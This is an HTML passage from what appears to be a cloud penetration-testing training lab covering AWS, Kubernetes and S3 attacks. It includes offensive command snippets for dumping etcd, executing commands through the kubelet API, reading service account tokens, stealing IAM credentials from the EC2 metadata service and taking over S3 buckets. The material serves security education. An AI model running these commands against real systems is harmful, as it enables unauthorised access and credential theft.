<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Security & Hacking Lab - Hexworth Prime Dark Arts Vault</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #a855f7;
            --accent: #dc2626;
            --bg: #0a0a0f;
            --surface: #1a1a2e;
            --surface-light: #2a2a3e;
            --text: #e0e0e0;
            --text-dim: #a0a0a0;
            --border: #3a3a4e;
            --success: #10b981;
            --warning: #f59e0b;
            --info: #3b82f6;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, var(--bg) 0%, #1a0a2e 100%);
            color: var(--text);
            line-height: 1.6;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        header {
            text-align: center;
            margin-bottom: 30px;
            padding: 30px;
            background: linear-gradient(135deg, var(--surface) 0%, var(--surface-light) 100%);
            border-radius: 15px;
            border: 2px solid var(--primary);
            box-shadow: 0 0 30px rgba(168, 85, 247, 0.3);
        }

        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .subtitle {
            color: var(--text-dim);
            font-size: 1.1em;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: var(--surface);
            border-radius: 10px;
            margin-top: 20px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--accent));
            width: 0%;
            transition: width 0.5s ease;
            box-shadow: 0 0 10px var(--primary);
        }

        .progress-text {
            text-align: center;
            margin-top: 10px;
            color: var(--text-dim);
        }

        nav {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 30px;
        }

        .nav-btn {
            padding: 12px 24px;
            background: var(--surface);
            border: 2px solid var(--primary);
            border-radius: 8px;
            color: var(--text);
            cursor: pointer;
            font-size: 1em;
            transition: all 0.3s ease;
        }

        .nav-btn:hover {
            background: var(--primary);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(168, 85, 247, 0.4);
        }

        .nav-btn.active {
            background: var(--primary);
            box-shadow: 0 0 20px rgba(168, 85, 247, 0.5);
        }

        .section {
            display: none;
            animation: fadeIn 0.5s ease;
        }

        .section.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card {
            background: var(--surface);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid var(--border);
            transition: all 0.3s ease;
        }

        .card:hover {
            border-color: var(--primary);
            box-shadow: 0 5px 20px rgba(168, 85, 247, 0.2);
        }

        .card h2 {
            color: var(--primary);
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .card h3 {
            color: var(--accent);
            margin: 20px 0 10px;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .tool-card {
            background: var(--surface-light);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid var(--border);
            transition: all 0.3s ease;
        }

        .tool-card:hover {
            border-color: var(--primary);
            transform: translateY(-5px);
            box-shadow: 0 8px 20px rgba(168, 85, 247, 0.3);
        }

        .tool-name {
            color: var(--primary);
            font-weight: bold;
            font-size: 1.2em;
            margin-bottom: 10px;
        }

        .simulator {
            background: var(--bg);
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid var(--primary);
        }

        .terminal {
            background: #000;
            border-radius: 8px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            color: #0f0;
            min-height: 200px;
            margin: 15px 0;
            overflow-x: auto;
        }

        .terminal-line {
            margin: 5px 0;
            animation: typewriter 0.5s steps(40);
        }

        @keyframes typewriter {
            from { width: 0; opacity: 0; }
            to { width: 100%; opacity: 1; }
        }

        .prompt {
            color: #00ff00;
        }

        .error {
            color: #ff0000;
        }

        .success {
            color: #00ff00;
        }

        .warning {
            color: #ffaa00;
        }

        input[type="text"], textarea, select {
            width: 100%;
            padding: 12px;
            background: var(--surface-light);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: var(--text);
            font-size: 1em;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
        }

        textarea {
            min-height: 200px;
            resize: vertical;
        }

        button {
            padding: 12px 24px;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 1em;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 5px;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(168, 85, 247, 0.5);
        }

        button:active {
            transform: translateY(0);
        }

        .attack-chain {
            background: var(--surface-light);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }

        .attack-step {
            display: flex;
            align-items: center;
            margin: 15px 0;
            padding: 15px;
            background: var(--surface);
            border-radius: 8px;
            border-left: 4px solid var(--primary);
            transition: all 0.3s ease;
        }

        .attack-step:hover {
            transform: translateX(10px);
            box-shadow: 0 5px 15px rgba(168, 85, 247, 0.3);
        }

        .step-number {
            width: 40px;
            height: 40px;
            background: var(--primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
            flex-shrink: 0;
        }

        .arrow {
            text-align: center;
            color: var(--accent);
            font-size: 1.5em;
            margin: 10px 0;
        }

        .diagram {
            background: var(--surface-light);
            border-radius: 10px;
            padding: 30px;
            margin: 20px 0;
            text-align: center;
        }

        .k8s-node {
            background: var(--surface);
            border: 2px solid var(--primary);
            border-radius: 10px;
            padding: 15px;
            margin: 10px;
            display: inline-block;
            min-width: 150px;
            transition: all 0.3s ease;
        }

        .k8s-node:hover {
            border-color: var(--accent);
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(220, 38, 38, 0.4);
        }

        .vulnerability {
            background: var(--accent);
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 0.85em;
            margin-top: 8px;
            display: inline-block;
        }

        .quiz-container {
            background: var(--surface);
            border-radius: 12px;
            padding: 25px;
            margin: 20px 0;
        }

        .question {
            margin: 25px 0;
            padding: 20px;
            background: var(--surface-light);
            border-radius: 10px;
            border-left: 4px solid var(--primary);
        }

        .question h3 {
            color: var(--primary);
            margin-bottom: 15px;
        }

        .options {
            margin: 15px 0;
        }

        .option {
            display: block;
            padding: 12px;
            margin: 8px 0;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .option:hover {
            border-color: var(--primary);
            background: var(--surface-light);
        }

        .option input[type="radio"] {
            margin-right: 10px;
        }

        .option.correct {
            border-color: var(--success);
            background: rgba(16, 185, 129, 0.1);
        }

        .option.incorrect {
            border-color: var(--accent);
            background: rgba(220, 38, 38, 0.1);
        }

        .result {
            margin-top: 20px;
            padding: 20px;
            background: var(--surface-light);
            border-radius: 10px;
            text-align: center;
        }

        .score {
            font-size: 2em;
            color: var(--primary);
            margin: 10px 0;
        }

        .badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 5px;
            font-size: 0.9em;
            margin: 5px;
            font-weight: bold;
        }

        .badge.aws {
            background: #ff9900;
            color: #000;
        }

        .badge.k8s {
            background: #326ce5;
            color: white;
        }

        .badge.gcp {
            background: #4285f4;
            color: white;
        }

        .badge.azure {
            background: #0078d4;
            color: white;
        }

        .metadata-viewer {
            background: #000;
            border-radius: 8px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            color: var(--text);
            margin: 15px 0;
            max-height: 400px;
            overflow-y: auto;
        }

        .json-key {
            color: #ff79c6;
        }

        .json-value {
            color: #50fa7b;
        }

        .json-string {
            color: #f1fa8c;
        }

        .priv-esc-path {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin: 20px 0;
        }

        .priv-level {
            background: var(--surface-light);
            border-radius: 10px;
            padding: 20px;
            border: 2px solid var(--border);
            position: relative;
            transition: all 0.3s ease;
        }

        .priv-level:hover {
            border-color: var(--accent);
            transform: scale(1.02);
        }

        .priv-level.active {
            border-color: var(--success);
            box-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
        }

        .back-btn {
            position: fixed;
            top: 20px;
            left: 20px;
            padding: 10px 20px;
            background: var(--surface);
            border: 2px solid var(--primary);
            border-radius: 8px;
            color: var(--text);
            text-decoration: none;
            transition: all 0.3s ease;
            z-index: 1000;
        }

        .back-btn:hover {
            background: var(--primary);
            transform: translateX(-5px);
        }

        .info-box {
            background: rgba(59, 130, 246, 0.1);
            border-left: 4px solid var(--info);
            padding: 15px;
            margin: 15px 0;
            border-radius: 6px;
        }

        .warning-box {
            background: rgba(245, 158, 11, 0.1);
            border-left: 4px solid var(--warning);
            padding: 15px;
            margin: 15px 0;
            border-radius: 6px;
        }

        .danger-box {
            background: rgba(220, 38, 38, 0.1);
            border-left: 4px solid var(--accent);
            padding: 15px;
            margin: 15px 0;
            border-radius: 6px;
        }

        .code-block {
            background: #1e1e1e;
            border-radius: 6px;
            padding: 15px;
            margin: 10px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            border: 1px solid var(--border);
        }

        .code-block code {
            color: #d4d4d4;
        }

        ul {
            margin: 15px 0;
            padding-left: 25px;
        }

        li {
            margin: 8px 0;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 1.8em;
            }

            .grid {
                grid-template-columns: 1fr;
            }

            nav {
                flex-direction: column;
            }

            .back-btn {
                position: static;
                display: block;
                margin-bottom: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="../index.html" class="back-btn">‚Üê Back to Vault</a>

        <header>
            <h1>‚òÅÔ∏è Cloud Security & Hacking Lab</h1>
            <p class="subtitle">Master AWS, Azure, GCP & Kubernetes Security Testing</p>
            <div class="progress-bar">
                <div class="progress-fill" id="progressBar"></div>
            </div>
            <div class="progress-text" id="progressText">Progress: 0% - 0 XP / 80 XP</div>
        </header>

        <nav>
            <button class="nav-btn active" onclick="showSection('overview')">Overview</button>
            <button class="nav-btn" onclick="showSection('scanning')">Vulnerability Scanning</button>
            <button class="nav-btn" onclick="showSection('k8s')">Kubernetes Security</button>
            <button class="nav-btn" onclick="showSection('s3')">S3 Bucket Discovery</button>
            <button class="nav-btn" onclick="showSection('aws-enum')">AWS Enumeration</button>
            <button class="nav-btn" onclick="showSection('priv-esc')">Privilege Escalation</button>
            <button class="nav-btn" onclick="showSection('ssrf')">SSRF Attack Demo</button>
            <button class="nav-btn" onclick="showSection('tools')">Attack Tools</button>
            <button class="nav-btn" onclick="showSection('quiz')">Quiz</button>
        </nav>

        <!-- Overview Section -->
        <div id="overview" class="section active">
            <div class="card">
                <h2>üéØ Cloud Security & Hacking Overview</h2>
                <p>Welcome to the Cloud Security & Hacking Lab, where you'll learn offensive security techniques for cloud environments including AWS, Azure, GCP, and Kubernetes.</p>

                <h3>What You'll Master:</h3>
                <ul>
                    <li><strong>Cloud Vulnerability Scanning:</strong> Identify security flaws in containers and cloud infrastructure</li>
                    <li><strong>Kubernetes Security:</strong> Exploit misconfigurations in orchestration platforms</li>
                    <li><strong>S3 Bucket Discovery:</strong> Find and exploit exposed AWS storage</li>
                    <li><strong>AWS Enumeration:</strong> Discover accounts, IAM roles, and credentials</li>
                    <li><strong>Privilege Escalation:</strong> Elevate permissions in cloud environments</li>
                    <li><strong>SSRF Attacks:</strong> Exploit metadata services for credential theft</li>
                </ul>

                <div class="info-box">
                    <strong>üéì Learning Objectives:</strong><br>
                    By completing this lab, you will understand cloud attack surfaces, enumeration techniques, privilege escalation paths, and defensive countermeasures.
                </div>

                <div class="warning-box">
                    <strong>‚ö†Ô∏è Ethical Notice:</strong><br>
                    The techniques demonstrated here are for educational purposes and authorized security testing only. Unauthorized access to cloud resources is illegal.
                </div>

                <h3>Cloud Security Shared Responsibility Model</h3>
                <div class="attack-chain">
                    <div class="attack-step">
                        <div class="step-number">‚òÅÔ∏è</div>
                        <div>
                            <strong>Cloud Provider Responsibility</strong><br>
                            Physical security, infrastructure, hypervisor, network isolation
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">üîß</div>
                        <div>
                            <strong>Customer Responsibility</strong><br>
                            OS security, application security, data encryption, IAM, network config
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">üéØ</div>
                        <div>
                            <strong>Common Attack Surface</strong><br>
                            Misconfigurations, exposed credentials, overprivileged IAM, public storage
                        </div>
                    </div>
                </div>

                <h3>Cloud Platforms</h3>
                <div class="grid">
                    <div class="tool-card">
                        <div class="tool-name"><span class="badge aws">AWS</span> Amazon Web Services</div>
                        <p>Market leader with EC2, S3, IAM, Lambda. Common targets: metadata service (169.254.169.254), exposed S3 buckets, IAM misconfigurations.</p>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name"><span class="badge azure">Azure</span> Microsoft Azure</div>
                        <p>Enterprise-focused platform with VMs, Blob Storage, AAD. Targets: IMDS endpoint, storage account keys, managed identities.</p>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name"><span class="badge gcp">GCP</span> Google Cloud Platform</div>
                        <p>Developer-friendly with Compute Engine, Cloud Storage, IAM. Targets: metadata server, service account keys, storage buckets.</p>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name"><span class="badge k8s">K8s</span> Kubernetes</div>
                        <p>Container orchestration platform. Targets: etcd, API server, kubelet, exposed dashboards, RBAC misconfigurations.</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Vulnerability Scanning Section -->
        <div id="scanning" class="section">
            <div class="card">
                <h2>üîç Cloud Vulnerability Scanning</h2>
                <p>Identify security vulnerabilities in container images, cloud configurations, and infrastructure as code.</p>

                <h3>Container Image Scanning Tools</h3>
                <div class="grid">
                    <div class="tool-card">
                        <div class="tool-name">Trivy</div>
                        <p><strong>By Aqua Security</strong></p>
                        <p>Comprehensive vulnerability scanner for containers, file systems, and Git repositories. Detects CVEs, misconfigurations, and secrets.</p>
                        <div class="code-block"><code>trivy image nginx:latest<br>trivy fs --security-checks vuln,config .</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">Clair</div>
                        <p><strong>By CoreOS/Red Hat</strong></p>
                        <p>Static analysis of vulnerabilities in container images. Integrates with CI/CD pipelines for automated scanning.</p>
                        <div class="code-block"><code>clairctl analyze nginx:latest<br>clairctl report nginx:latest</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">Dagda</div>
                        <p><strong>Open Source</strong></p>
                        <p>Static analysis of known vulnerabilities, trojans, viruses, and malware in Docker images.</p>
                        <div class="code-block"><code>dagda vuln --docker_image nginx:latest</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">Twistlock</div>
                        <p><strong>By Palo Alto Networks</strong></p>
                        <p>Enterprise container security platform with runtime protection, compliance, and vulnerability management.</p>
                        <div class="code-block"><code>twistcli images scan nginx:latest</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">Sysdig</div>
                        <p><strong>Commercial Platform</strong></p>
                        <p>Container intelligence and security platform with runtime detection and forensics capabilities.</p>
                        <div class="code-block"><code>sysdig-cli-scanner nginx:latest</code></div>
                    </div>
                </div>

                <h3>Interactive Scanner Simulator</h3>
                <div class="simulator">
                    <label for="imageInput">Enter container image to scan:</label>
                    <input type="text" id="imageInput" placeholder="e.g., nginx:1.19, node:14-alpine, ubuntu:18.04" value="nginx:1.19">
                    <button onclick="scanImage()">üîç Scan Image</button>
                    <button onclick="clearScanResults()">Clear Results</button>

                    <div class="terminal" id="scanOutput">
                        <div class="terminal-line"><span class="prompt">$</span> Waiting for scan command...</div>
                    </div>
                </div>

                <div class="info-box">
                    <strong>üí° Best Practices:</strong>
                    <ul>
                        <li>Scan images before deployment in CI/CD pipelines</li>
                        <li>Use minimal base images (Alpine, Distroless) to reduce attack surface</li>
                        <li>Regularly update base images and dependencies</li>
                        <li>Implement image signing and verification</li>
                        <li>Monitor runtime behavior for anomalies</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- Kubernetes Security Section -->
        <div id="k8s" class="section">
            <div class="card">
                <h2>‚öì Kubernetes Security</h2>
                <p>Understand Kubernetes architecture and common attack vectors for penetration testing.</p>

                <h3>Kubernetes Architecture & Attack Surfaces</h3>
                <div class="diagram">
                    <div class="k8s-node">
                        <strong>Master Node</strong><br>
                        <small>Control Plane</small>
                        <div class="vulnerability">API Server :6443</div>
                        <div class="vulnerability">etcd :2379</div>
                        <div class="vulnerability">Scheduler</div>
                    </div>
                    <div class="k8s-node">
                        <strong>Worker Node 1</strong><br>
                        <small>Workload Execution</small>
                        <div class="vulnerability">Kubelet :10250</div>
                        <div class="vulnerability">Container Runtime</div>
                        <div class="vulnerability">kube-proxy</div>
                    </div>
                    <div class="k8s-node">
                        <strong>Worker Node 2</strong><br>
                        <small>Workload Execution</small>
                        <div class="vulnerability">Kubelet :10250</div>
                        <div class="vulnerability">Container Runtime</div>
                        <div class="vulnerability">kube-proxy</div>
                    </div>
                </div>

                <h3>Key Attack Vectors</h3>
                <div class="attack-chain">
                    <div class="attack-step">
                        <div class="step-number">1</div>
                        <div>
                            <strong>etcd Enumeration (Port 2379)</strong><br>
                            Distributed key-value store containing cluster secrets, configurations, and state. If exposed without authentication, attackers can extract credentials and API tokens.
                            <div class="code-block"><code>curl http://target:2379/v2/keys/?recursive=true<br>etcdctl get / --prefix --keys-only</code></div>
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">2</div>
                        <div>
                            <strong>API Server Exploitation (Port 6443/8080)</strong><br>
                            Unauthenticated or weakly authenticated API access allows cluster control. Check for anonymous access and RBAC misconfigurations.
                            <div class="code-block"><code>kubectl --insecure-skip-tls-verify get pods<br>kubectl auth can-i --list</code></div>
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">3</div>
                        <div>
                            <strong>Kubelet API (Port 10250)</strong><br>
                            Node agent that can be exploited for command execution in containers, pod information disclosure, and node compromise.
                            <div class="code-block"><code>curl -k https://target:10250/pods<br>curl -k https://target:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt; -d "cmd=id"</code></div>
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">4</div>
                        <div>
                            <strong>Configuration File Exploitation</strong><br>
                            Exposed kubeconfig files, service account tokens mounted in pods, and secrets stored insecurely.
                            <div class="code-block"><code>cat /var/run/secrets/kubernetes.io/serviceaccount/token<br>kubectl --token=$TOKEN get secrets</code></div>
                        </div>
                    </div>
                </div>

                <h3>Kubernetes Enumeration Checklist</h3>
                <div class="simulator">
                    <div class="options">
                        <label class="option">
                            <input type="checkbox" onchange="updateK8sProgress()"> Port scan for 2379, 6443, 8080, 10250, 10255
                        </label>
                        <label class="option">
                            <input type="checkbox" onchange="updateK8sProgress()"> Check etcd for unauthenticated access
                        </label>
                        <label class="option">
                            <input type="checkbox" onchange="updateK8sProgress()"> Test API server for anonymous authentication
                        </label>
                        <label class="option">
                            <input type="checkbox" onchange="updateK8sProgress()"> Enumerate RBAC permissions with current token
                        </label>
                        <label class="option">
                            <input type="checkbox" onchange="updateK8sProgress()"> Check kubelet API for RCE capabilities
                        </label>
                        <label class="option">
                            <input type="checkbox" onchange="updateK8sProgress()"> Search for exposed kubeconfig files
                        </label>
                        <label class="option">
                            <input type="checkbox" onchange="updateK8sProgress()"> Enumerate service account tokens in pods
                        </label>
                        <label class="option">
                            <input type="checkbox" onchange="updateK8sProgress()"> Check for privileged pods and hostPath mounts
                        </label>
                    </div>
                    <div id="k8sProgress" class="info-box" style="margin-top: 15px;">
                        <strong>Enumeration Progress:</strong> 0/8 checks completed
                    </div>
                </div>

                <div class="danger-box">
                    <strong>üî¥ Critical Misconfigurations:</strong>
                    <ul>
                        <li>Anonymous authentication enabled on API server</li>
                        <li>etcd exposed without TLS/authentication</li>
                        <li>Kubelet read-only port (10255) accessible</li>
                        <li>Overly permissive RBAC (cluster-admin to default service accounts)</li>
                        <li>Privileged containers with hostPath or hostNetwork</li>
                        <li>Dashboard exposed without authentication</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- S3 Bucket Discovery Section -->
        <div id="s3" class="section">
            <div class="card">
                <h2>ü™£ S3 Bucket Discovery & Exploitation</h2>
                <p>Learn techniques to discover and exploit misconfigured AWS S3 buckets containing sensitive data.</p>

                <h3>S3 Bucket Discovery Methods</h3>
                <div class="grid">
                    <div class="tool-card">
                        <div class="tool-name">1. Source Code Analysis</div>
                        <p>Search application source code, JavaScript files, and mobile apps for hardcoded S3 bucket names and URLs.</p>
                        <div class="code-block"><code>grep -r "s3.amazonaws.com" .<br>grep -r ".s3." *.js</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">2. Brute Force Discovery</div>
                        <p>Use wordlists to generate common bucket names based on company names, domains, and common patterns.</p>
                        <div class="code-block"><code>s3scanner scan --buckets-file wordlist.txt<br>./BucketKicker.py wordlist.txt</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">3. Grayhat Warfare</div>
                        <p>Search engine for publicly exposed S3 buckets. Search by bucket name, file type, or keywords in content.</p>
                        <div class="code-block"><code>https://buckets.grayhatwarfare.com/<br>Search: company-name backup</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">4. S3 Inspector</div>
                        <p>Check bucket permissions, ACLs, and policies for misconfigurations allowing unauthorized access.</p>
                        <div class="code-block"><code>aws s3api get-bucket-acl --bucket target<br>aws s3api get-bucket-policy --bucket target</code></div>
                    </div>
                </div>

                <h3>Interactive S3 Bucket Discovery Simulator</h3>
                <div class="simulator">
                    <label for="companyName">Enter company/domain name for bucket discovery:</label>
                    <input type="text" id="companyName" placeholder="e.g., acmecorp, example-inc">
                    <button onclick="discoverBuckets()">üîç Discover Buckets</button>
                    <button onclick="testBucketAccess()">üîì Test Access Permissions</button>

                    <div class="terminal" id="s3Output">
                        <div class="terminal-line"><span class="prompt">$</span> S3 bucket discovery simulator ready...</div>
                    </div>
                </div>

                <h3>S3 Bucket Naming Patterns</h3>
                <div class="info-box">
                    <strong>Common patterns to test:</strong>
                    <ul>
                        <li><code>company-name</code>, <code>companyname</code>, <code>company_name</code></li>
                        <li><code>company-backups</code>, <code>company-logs</code>, <code>company-data</code></li>
                        <li><code>company-prod</code>, <code>company-dev</code>, <code>company-staging</code></li>
                        <li><code>company-assets</code>, <code>company-uploads</code>, <code>company-files</code></li>
                        <li><code>domain.com</code>, <code>www.domain.com</code>, <code>assets.domain.com</code></li>
                    </ul>
                </div>

                <h3>Permission Testing</h3>
                <div class="attack-chain">
                    <div class="attack-step">
                        <div class="step-number">R</div>
                        <div>
                            <strong>READ Permission</strong><br>
                            List bucket contents and download objects
                            <div class="code-block"><code>aws s3 ls s3://bucket-name --no-sign-request</code></div>
                        </div>
                    </div>
                    <div class="attack-step">
                        <div class="step-number">W</div>
                        <div>
                            <strong>WRITE Permission</strong><br>
                            Upload files to bucket (potential malware hosting)
                            <div class="code-block"><code>aws s3 cp test.txt s3://bucket-name/ --no-sign-request</code></div>
                        </div>
                    </div>
                    <div class="attack-step">
                        <div class="step-number">F</div>
                        <div>
                            <strong>FULL_CONTROL Permission</strong><br>
                            Modify ACLs, delete objects, complete bucket takeover
                            <div class="code-block"><code>aws s3api put-bucket-acl --bucket name --acl public-read</code></div>
                        </div>
                    </div>
                </div>

                <div class="danger-box">
                    <strong>üî¥ Real-World S3 Breaches:</strong>
                    <ul>
                        <li><strong>Capital One (2019):</strong> 100M+ records exposed via SSRF to metadata service</li>
                        <li><strong>Uber (2016):</strong> 57M records from publicly accessible S3 bucket</li>
                        <li><strong>Verizon (2017):</strong> 14M customer records in unsecured bucket</li>
                        <li><strong>GoDaddy (2019):</strong> Multiple buckets with customer data publicly readable</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- AWS Enumeration Section -->
        <div id="aws-enum" class="section">
            <div class="card">
                <h2>üîé AWS Enumeration</h2>
                <p>Discover AWS account information, IAM roles, credentials, and cloud infrastructure details.</p>

                <h3>AWS Account ID Discovery</h3>
                <div class="grid">
                    <div class="tool-card">
                        <div class="tool-name">GitHub Search</div>
                        <p>Search GitHub for hardcoded credentials, config files, and CloudFormation templates containing account IDs.</p>
                        <div class="code-block"><code>site:github.com "company-name" "aws_access_key_id"<br>site:github.com "company-name" "arn:aws:iam"</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">Error Messages</div>
                        <p>Trigger verbose error messages that leak account IDs through invalid ARN references.</p>
                        <div class="code-block"><code>aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/test<br>aws s3api get-object --bucket name --key test</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">AMI Discovery</div>
                        <p>Public AMIs and snapshots contain owner account IDs in their metadata.</p>
                        <div class="code-block"><code>aws ec2 describe-images --owners self<br>aws ec2 describe-snapshots --owner-ids ACCOUNT</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">DNS & SSL Certs</div>
                        <p>CloudFront distributions and ALB DNS names can reveal account information.</p>
                        <div class="code-block"><code>dig cloudfront.net ANY<br>openssl s_client -connect target:443</code></div>
                    </div>
                </div>

                <h3>IAM Role & Credential Discovery</h3>
                <div class="attack-chain">
                    <div class="attack-step">
                        <div class="step-number">1</div>
                        <div>
                            <strong>Git Repository Mining</strong><br>
                            Search GitHub, GitLab, Bitbucket for exposed credentials, .env files, and AWS config files.
                            <div class="code-block"><code>trufflehog git https://github.com/target/repo<br>git-secrets --scan</code></div>
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">2</div>
                        <div>
                            <strong>Social Engineering</strong><br>
                            Phishing attacks targeting developers with access to AWS Console or CLI credentials.
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">3</div>
                        <div>
                            <strong>Password Reuse</strong><br>
                            Test leaked credentials from public breaches against AWS Console login.
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">4</div>
                        <div>
                            <strong>SSRF to Metadata Service</strong><br>
                            Exploit SSRF vulnerabilities to access EC2 metadata service and steal IAM role credentials.
                            <div class="code-block"><code>http://169.254.169.254/latest/meta-data/<br>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></div>
                        </div>
                    </div>
                </div>

                <h3>EC2 Metadata Service Exploitation</h3>
                <div class="simulator">
                    <p>The EC2 metadata service provides instance metadata and temporary IAM credentials. It's accessible from within EC2 instances at a link-local address.</p>

                    <label for="metadataUrl">Enter metadata endpoint to query:</label>
                    <select id="metadataUrl">
                        <option value="/">/latest/meta-data/</option>
                        <option value="/instance-id">/latest/meta-data/instance-id</option>
                        <option value="/iam/info">/latest/meta-data/iam/info</option>
                        <option value="/iam/security-credentials/">/latest/meta-data/iam/security-credentials/</option>
                        <option value="/user-data">/latest/user-data</option>
                        <option value="/public-keys/">/latest/meta-data/public-keys/</option>
                    </select>
                    <button onclick="queryMetadata()">üîç Query Metadata Service</button>

                    <div class="metadata-viewer" id="metadataOutput">
                        <div style="color: #888;">Metadata response will appear here...</div>
                    </div>
                </div>

                <div class="info-box">
                    <strong>üí° IMDSv2 Protection:</strong><br>
                    AWS introduced IMDSv2 (Instance Metadata Service Version 2) which requires a session token obtained via PUT request, mitigating SSRF attacks. Always check both v1 and v2 availability.
                    <div class="code-block"><code>TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`<br>curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/</code></div>
                </div>

                <h3>Credential Validation</h3>
                <div class="simulator">
                    <label for="accessKey">AWS Access Key ID:</label>
                    <input type="text" id="accessKey" placeholder="AKIA...">

                    <label for="secretKey">AWS Secret Access Key:</label>
                    <input type="text" id="secretKey" placeholder="Enter secret key">

                    <button onclick="validateCredentials()">‚úì Validate Credentials</button>

                    <div class="terminal" id="credOutput">
                        <div class="terminal-line"><span class="prompt">$</span> Enter credentials to validate...</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Privilege Escalation Section -->
        <div id="priv-esc" class="section">
            <div class="card">
                <h2>‚¨ÜÔ∏è AWS Privilege Escalation</h2>
                <p>Techniques to elevate privileges from limited IAM permissions to administrator access.</p>

                <h3>Privilege Escalation Path Visualizer</h3>
                <div class="priv-esc-path">
                    <div class="priv-level" id="privLevel1">
                        <h3>Level 1: Initial Access (Low Privilege)</h3>
                        <p><strong>Permissions:</strong> ec2:DescribeInstances, s3:ListBucket (Read-only)</p>
                        <p><strong>Goal:</strong> Enumerate environment and identify escalation vectors</p>
                        <div class="code-block"><code>aws sts get-caller-identity<br>aws iam get-user<br>aws iam list-attached-user-policies --user-name username</code></div>
                        <button onclick="activatePrivLevel(2)">Attempt Escalation ‚Üí</button>
                    </div>

                    <div class="priv-level" id="privLevel2">
                        <h3>Level 2: EC2 Instance with Existing Profile</h3>
                        <p><strong>Required Permissions:</strong> iam:PassRole + ec2:RunInstances</p>
                        <p><strong>Technique:</strong> Launch EC2 instance with privileged IAM role attached, then access metadata service to steal credentials.</p>
